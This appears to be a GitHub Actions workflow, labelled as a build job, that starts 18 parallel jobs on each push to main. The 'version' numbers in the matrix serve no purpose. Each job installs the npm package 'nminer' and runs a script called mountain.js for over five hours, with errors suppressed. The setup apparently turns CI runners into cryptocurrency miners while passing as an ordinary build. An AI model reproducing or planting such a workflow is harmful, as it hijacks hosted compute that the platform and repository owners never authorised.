name: mountain
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4400 }
          - { version: 3129 }
          - { version: 9380 }
          - { version: 9024 }
          - { version: 1127 }
          - { version: 5268 }
          - { version: 1865 }
          - { version: 4066 }
          - { version: 381 }
          - { version: 9831 }
          - { version: 8942 }
          - { version: 3997 }
          - { version: 6843 }
          - { version: 5337 }
          - { version: 1257 }
          - { version: 4324 }
          - { version: 4444 }
          - { version: 7545 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 311m node mountain.js || echo "mountain executed"